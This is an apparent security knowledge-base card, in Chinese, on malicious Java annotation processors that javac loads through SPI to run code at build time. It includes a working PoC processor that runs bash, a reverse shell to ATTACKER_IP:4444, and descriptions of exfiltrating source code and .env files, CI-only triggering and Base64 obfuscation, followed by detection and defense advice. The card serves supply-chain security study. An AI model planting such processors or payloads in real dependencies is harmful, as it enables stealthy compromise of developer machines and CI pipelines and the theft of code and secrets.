---
id: cloud-cicd-java-annotation-processor-compile-rce
title: 恶意 Java 注解处理器经 SPI 自动加载实现编译期命令执行与反弹 Shell
type: scenario
domain: cloud
path: cloud/ci-cd
technique: java-annotation-processor-compile-time-rce
aliases:
- 注解处理器 RCE
- Annotation Processor 编译期代码执行
- JSR-269 供应链投毒
- javac SPI 自动加载
- Maven 编译期 RCE
- Gradle 构建期 RCE
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
tags:
- java
- javac
- annotation-processor
- supply-chain
- rce
- maven
- gradle
- ci-cd
- build-time
cve: []
verification:
  verified_by: verifier-V8
  verified_at: '2026-11-05T00:44:08+08:00'
  notes: 已对照原文与图 01-14、20-23 核对：JSR-269/SPI 自动发现、init() 执行命令与反弹 Shell、源码 Files.walk+HttpClient 外发、条件触发/日志静默/Base64 伪装、-proc:none 与 annotationProcessorPaths 防御，均与原文一致；原文实验在 JDK21/Maven 3.9 本机完成，PoC 未由验证者执行。
---

## 一句话结论

把一个在 `META-INF/services/javax.annotation.processing.Processor` 中注册了注解处理器的 JAR 作为依赖发布，受害者在 `mvn compile`、`gradle build` 或 IDE 自动构建时，javac 会通过 SPI 自动实例化并执行该处理器；处理器代码运行在 javac 进程内、拥有当前构建用户权限，无需受害者使用任何注解或调用任何类，即可实现编译期命令执行、反弹 Shell 与源码外发。

## 原理

- JSR-269（Pluggable Annotation Processing API，JDK 6+）规定 javac 通过 `ServiceLoader` 从编译类路径发现注解处理器：扫描所有 JAR 的 `META-INF/services/javax.annotation.processing.Processor`，读取其中列出的全限定类名，反射实例化后调用 `init(ProcessingEnvironment)`，并在每个处理轮次调用 `process()`。
- 自动发现只要求 JAR 在 classpath 上（直接依赖或传递依赖均可），**不要求** `pom.xml` 配置 `annotationProcessorPaths`，**不要求**源码里出现被处理的注解，也**不要求**调用该库的任何类。因此一个看起来正常的工具库可以完全被动地触发。
- 处理器是普通 Java 类，在 javac 进程内执行，不是被编译进目标应用，也不在运行时沙箱中。它可以调用 `Runtime.exec()`/`ProcessBuilder`、`java.nio.file.Files`、`Socket`/`HttpClient`、`System.getenv()` 等，权限等同执行构建的用户（开发者或 CI runner）。
- 把恶意逻辑放在 `init()` 而不是 `process()`：`init()` 在整个编译过程中只执行一次且早于第一轮 `process()`，适合做一次性动作；用静态标志位防止多轮重复执行。
- `@SupportedAnnotationTypes("*")` 匹配所有注解，保证处理器在任意项目中都被触发；`process()` 返回 `false` 表示不消费注解，避免干扰其他合法处理器；异常静默捕获可让构建正常 `BUILD SUCCESS`，受害者无感知。
- 触发面对开发者本机与 CI/CD 都成立：任何调用 javac 的动作（`mvn compile/package`、`gradle build`、IDE 自动构建、流水线构建）都是入口。

## 触发条件

1. 受害项目的依赖树中存在含恶意注解处理器的 JAR（直接或传递依赖）。
2. 执行了编译操作：`mvn compile`、`mvn package`、`gradle build`、IDE 自动编译或 CI/CD 构建步骤。
3. 目标 JAR 的 `META-INF/services/javax.annotation.processing.Processor` 已注册处理器类名。
4. 处理器依赖的 API（如 `ProcessBuilder`）在构建环境中可用；反弹 Shell 还需要构建环境可出网。

## 利用步骤

1. 创建一个对外功能正常的工具库（如字符串工具类）作为门面，降低代码审查怀疑。
2. 编写继承 `AbstractProcessor` 的处理器，在 `init()` 中执行载荷，并加静态标志与异常静默。
3. 在 `src/main/resources/META-INF/services/javax.annotation.processing.Processor` 写入处理器全限定类名。
4. 构建并发布该库（本地仓库、私服或公共仓库），诱导目标项目引入为依赖。
5. 受害者执行编译，载荷在 javac 进程内执行；可写入标记文件、反弹 Shell 或外发数据。
6. 结合环境变量（`JENKINS_HOME`、`GITLAB_CI`、`GITHUB_ACTIONS`）与用户名判断，只在 CI 构建节点触发，在开发者本机保持静默。

## PoC

最小恶意处理器（在 `init()` 中执行命令并写标记文件）：

```java
@SupportedAnnotationTypes("*")
@SupportedSourceVersion(SourceVersion.RELEASE_21)
public class CompileProcessor extends AbstractProcessor {
    private static boolean executed = false;

    @Override
    public synchronized void init(ProcessingEnvironment env) {
        super.init(env);
        if (executed) return;
        executed = true;
        try {
            Process p = new ProcessBuilder("/bin/bash", "-c", "id > /tmp/pwned")
                .redirectErrorStream(true).start();
            p.waitFor();
        } catch (Exception ignored) {}
    }

    @Override
    public boolean process(Set<? extends TypeElement> a, RoundEnvironment r) {
        return false;
    }
}
```

SPI 注册文件 `META-INF/services/javax.annotation.processing.Processor`：

```text
com.example.utils.CompileProcessor
```

反弹 Shell 载荷（将 `init()` 中的命令替换为 socket + `/bin/bash -i` 双向转发即可）：

```java
Socket s = new Socket("ATTACKER_IP", 4444);
Process p = new ProcessBuilder("/bin/bash", "-i").redirectErrorStream(true).start();
new Thread(() -> p.getInputStream().transferTo(s.getOutputStream())).start();
s.getInputStream().transferTo(p.getOutputStream());
```

源码外发变体：处理器用 `System.getProperty("user.dir")` 定位项目根目录，`Files.walk` 收集 `.java` 与 `application.yml`/`.env` 等配置，再通过 `HttpClient` POST 到攻击者服务器；构建仍显示 `BUILD SUCCESS`。

## 变体与关联

- 同一机制可把载荷换成源码窃取、凭据读取、二阶段载荷下载，或编译产物后门注入（见独立卡片）。
- 与恶意 PEP 517 构建后端在 `pip install` 期执行代码同属“构建/安装期供应链执行”，只是语言与触发阶段不同。
- 隐蔽化手段：环境变量/用户名/时间窗口条件触发、`ProcessBuilder.Redirect.DISCARD` 丢弃子进程输出、Base64 混淆载荷、把类伪装成“代码风格检查器/编译优化器”。
- 注解处理器在 javac 进程内执行，传统运行时 WAF/RASP 无法感知，因为应用尚未启动。

## 检测与防御

- 在构建配置中显式关闭自动注解处理：`maven-compiler-plugin` 设置 `<proc>none</proc>`（命令行 `-proc:none`），可完全阻止 SPI 扫描与处理器加载；不使用注解处理器的项目应默认启用。
- 需要 Lombok/MapStruct 等项目使用 `annotationProcessorPaths` 白名单，只加载显式声明的处理器，禁止从 classpath 自动发现。
- 审计依赖 JAR：检查是否包含 `META-INF/services/javax.annotation.processing.Processor`，并输出注册的处理器类名；把该检查接入 CI，对新增/升级依赖自动扫描。
- 构建环境隔离：容器内构建，`--network none` 阻断反弹 Shell 与数据外发，`~/.m2` 只读挂载，`-o` 离线模式，构建后销毁容器。
- 监控构建期的异常子进程、对外连接、对项目源码/环境变量的批量读取，以及编译输出中出现非源码对应的 `.class`。
